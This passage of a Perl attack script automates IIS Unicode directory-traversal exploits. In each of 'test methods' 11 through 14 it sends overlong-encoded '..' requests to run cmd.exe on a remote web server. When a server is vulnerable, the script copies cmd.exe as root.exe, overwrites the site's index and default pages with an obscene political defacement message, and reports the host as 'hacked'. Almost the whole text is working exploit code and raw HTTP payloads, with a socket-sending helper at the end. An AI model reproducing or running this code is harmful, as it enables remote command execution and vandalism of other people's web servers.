    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 11
my @results=sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 12
my @results=sendraw("GET /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%f8%80%80%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 13
my @results=sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2) 
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 14
my @results=sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe?/c\+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1) 
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe?/c\+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe?/c\+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe?/c\+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

}
}


sub sendraw {   
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
